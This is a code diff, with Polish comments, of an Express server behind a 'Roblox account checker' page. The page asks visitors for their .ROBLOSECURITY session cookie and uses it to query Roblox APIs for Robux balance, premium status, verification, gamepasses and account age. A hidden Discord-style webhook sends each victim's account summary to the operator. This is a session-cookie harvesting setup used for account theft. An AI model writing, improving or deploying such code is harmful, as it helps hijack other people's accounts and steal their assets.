@@ -3,7 +3,7 @@ const app = express();
 
 app.use(express.json());
 
-// CORS
+// CORS – żeby strona działała
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -14,7 +14,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// Strona główna – Twoja HTML (bez zmian)
+// Strona główna – Twoja oryginalna strona HTML
 app.get('/', (req, res) => {
   res.send(`<!DOCTYPE html>
 <html lang="en">
@@ -86,17 +86,18 @@ async function checkAccount() {
         <b>Display Name:</b> \${json.displayName}<br>
         <b>User ID:</b> \${json.userId}<br>
         <b>Roblox Premium:</b> <span style="color: \${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.hasPremium ? 'YES ✓' : 'NO ✗'}</span><br>
+       
         <b>Email / Phone Verified:</b> <span style="color: \${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
           \${json.emailVerified ? 'YES ✓ (hat detected)' : 'NO ✗'}
         </span><br>
+       
         <b>Robux Balance:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.robux.toLocaleString('en-US')} Robux</span><br>
-        <b>Total RAP (Limiteds):</b> <span style="color: #ffcc00; font-weight: bold;">\${json.totalRAP ? json.totalRAP.toLocaleString('en-US') : 'N/A'}</span><br>
-        <b>Owned Limiteds:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.limitedsCount || 0}</span><br>
+       
         <b>MM2 Gamepasses:</b> <span style="color: \${mm2Color}; font-weight: bold;">\${mm2Count}</span><br>
         <b>AMP Gamepasses:</b> <span style="color: \${ampColor}; font-weight: bold;">\${ampCount}</span><br>
         <b>SAB Gamepasses:</b> <span style="color: \${sabColor}; font-weight: bold;">\${sabCount}</span><br>
+       
         <b>Account Age:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.accountAgeDays} days</span><br>
-        <b>Owned Groups:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.ownedGroupsCount || 0}</span><br>
         <b>Created:</b> \${creationDate} \${json.created !== 'failed to fetch' ? \`<small>(\${json.created.split('T')[0]})\</small>\` : ''}<br>
       \`;
     }
@@ -109,7 +110,7 @@ async function checkAccount() {
 </html>`);
 });
 
-// Endpoint /check
+// Endpoint do sprawdzania konta + wysyłka na webhook
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
 
@@ -118,7 +119,7 @@ app.post('/check', async (req, res) => {
   }
 
   try {
-    // 1. CSRF Token
+    // CSRF Token
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
@@ -127,33 +128,43 @@ app.post('/check', async (req, res) => {
       },
     });
     const csrfToken = tokenRes.headers.get('x-csrf-token');
-    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');
+    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token – invalid/expired cookie?');
 
-    // 2. Dane użytkownika
+    // Dane użytkownika
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
+      method: 'GET',
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
         'X-CSRF-TOKEN': csrfToken,
         'Accept': 'application/json',
       },
     });
-    if (!userRes.ok) throw new Error('Invalid cookie or API error');
+    if (!userRes.ok) {
+      throw new Error(userRes.status === 401 ? 'Invalid or expired cookie' : `API error: ${userRes.status}`);
+    }
     const userData = await userRes.json();
 
-    // 3. Verified Email (hat 102611803)
+    // Verified Email (hat 102611803)
     let emailVerified = false;
     try {
       const ownsRes = await fetch(
         `https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`,
-        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
+        {
+          method: 'GET',
+          headers: {
+            'Cookie': `.ROBLOSECURITY=${cookie}`,
+            'X-CSRF-TOKEN': csrfToken,
+            'Accept': 'application/json',
+          },
+        }
       );
       if (ownsRes.ok) {
-        const data = await ownsRes.json();
-        emailVerified = Array.isArray(data.data) && data.data.length > 0;
+        const ownsData = await ownsRes.json();
+        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
       }
     } catch {}
 
-    // 4. Premium
+    // Premium
     let hasPremium = false;
     try {
       const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
@@ -162,7 +173,7 @@ app.post('/check', async (req, res) => {
       if (premiumRes.ok) hasPremium = await premiumRes.json();
     } catch {}
 
-    // 5. Robux
+    // Robux
     let robux = 0;
     try {
       const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
@@ -174,31 +185,31 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // 6. Account Age + Created
+    // Wiek konta + data utworzenia
     let accountAgeDays = 0;
-    let created = 'failed to fetch';
+    let createdDate = null;
     try {
       const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
       if (profileRes.ok) {
         const profile = await profileRes.json();
         if (profile.created) {
-          created = profile.created;
-          accountAgeDays = Math.floor((Date.now() - new Date(created).getTime()) / 86400000);
+          createdDate = profile.created;
+          accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
         }
       }
     } catch {}
 
-    // 7. Avatar
+    // Avatar
     let avatarUrl = null;
     try {
       const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
       if (thumbRes.ok) {
-        const data = await thumbRes.json();
-        avatarUrl = data.data?.[0]?.imageUrl || null;
+        const thumbData = await thumbRes.json();
+        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
       }
     } catch {}
 
-    // 8. Gamepasses MM2, AMP, SAB
+    // Gamepasy
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
@@ -208,48 +219,21 @@ app.post('/check', async (req, res) => {
       for (const passId of allIds) {
         const gpRes = await fetch(
           `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
-          { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
+          {
+            headers: {
+              'Cookie': `.ROBLOSECURITY=${cookie}`,
+              'X-CSRF-TOKEN': csrfToken,
+              'Accept': 'application/json',
+            },
+          }
         );
         if (gpRes.ok) {
-          const data = await gpRes.json();
-          if (Array.isArray(data.data) && data.data.length > 0) {
+          const gpData = await gpRes.json();
+          if (Array.isArray(gpData.data) && gpData.data.length > 0) {
             hasGamePasses.push(passId);
           }
         }
       }
-    } catch {}
-
-    // 9. Owned Groups count
-    let ownedGroupsCount = 0;
-    try {
-      const groupsRes = await fetch(`https://groups.roblox.com/v1/users/${userData.id}/groups/affiliations?role=Owner`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
-      });
-      if (groupsRes.ok) {
-        const data = await groupsRes.json();
-        ownedGroupsCount = data.data?.length || 0;
-      }
-    } catch {}
-
-    // 10. Total RAP + liczba owned limiteds
-    let totalRAP = 0;
-    let limitedsCount = 0;
-    try {
-      let cursor = null;
-      do {
-        const url = `https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100${cursor ? `&cursor=${cursor}` : ''}`;
-        const res = await fetch(url, {
-          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
-        });
-        if (res.ok) {
-          const data = await res.json();
-          data.data.forEach(item => {
-            limitedsCount++;
-            if (item.recentAveragePrice) totalRAP += item.recentAveragePrice;
-          });
-          cursor = data.nextPageCursor;
-        } else break;
-      } while (cursor);
     } catch {}
 
     const result = {
@@ -260,18 +244,15 @@ app.post('/check', async (req, res) => {
       hasPremium,
       robux,
       accountAgeDays,
-      created,
+      created: createdDate || 'failed to fetch',
       avatarUrl,
       hasGamePasses,
       emailVerified,
-      totalRAP,
-      limitedsCount,
-      ownedGroupsCount,
     };
 
-    res.json(result);
+    res.status(200).json(result);
 
-    // Wysyłka do webhooka – dokładnie pola, które chcesz
+    // Wysyłka do webhooka – z Twoim custom emoji robux
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -281,38 +262,41 @@ app.post('/check', async (req, res) => {
           body: JSON.stringify({
             embeds: [{
               title: `${userData.name} Roblox Info`,
-              color: 0x5865F2,
-              thumbnail: { url: avatarUrl || "https://www.roblox.com/headshot-thumbnail/image?userId=" + userData.id + "&width=720&height=720&format=png" },
+              color: 0x9B59B6,  // fioletowy
+              thumbnail: {
+                url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
+              },
               fields: [
                 { name: "Username", value: userData.name, inline: true },
                 { name: "Roblox Premium", value: hasPremium ? "Yes" : "No", inline: true },
                 { name: "Email / Phone Verified", value: emailVerified ? "Yes" : "No", inline: true },
-                { name: "Robux Balance", value: robux.toLocaleString(), inline: true },
-                { name: "Total RAP (Limiteds)", value: totalRAP.toLocaleString(), inline: true },
-                { name: "Owned Limiteds", value: limitedsCount.toString(), inline: true },
-                { name: "MM2", value: mm2Ids.filter(id => hasGamePasses.includes(id)).length.toString(), inline: true },
-                { name: "AMP", value: ampIds.filter(id => hasGamePasses.includes(id)).length.toString(), inline: true },
-                { name: "SAB", value: sabIds.filter(id => hasGamePasses.includes(id)).length.toString(), inline: true },
-                { name: "Account Age", value: accountAgeDays + " days", inline: true },
-                { name: "Owned Groups", value: ownedGroupsCount.toString(), inline: true },
-                { name: "Created", value: created !== 'failed to fetch' ? created.split('T')[0] : "?", inline: true },
+                {
+                  name: "\u200B",  // niewidoczna nazwa pola
+                  value: `<:robux:1481759314426204230> ${robux.toLocaleString()}`,
+                  inline: true
+                },
+                { name: "Created", value: createdDate ? createdDate.split('T')[0] : "?", inline: true },
+                { name: "Account Age", value: `${accountAgeDays} days`, inline: true }
               ],
+              footer: {
+                text: "Checker • " + new Date().toLocaleString()
+              },
               timestamp: new Date().toISOString()
             }]
           })
         });
       } catch (e) {
-        console.error('Webhook failed:', e.message);
+        console.error("Błąd wysyłki webhook:", e.message);
       }
     }
 
   } catch (err) {
     console.error(err);
-    res.status(500).json({ error: err.message || 'Server error' });
+    res.status(500).json({ error: err.message || 'Internal server error' });
   }
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log(`Serwer działa na porcie ${PORT}`);
 });
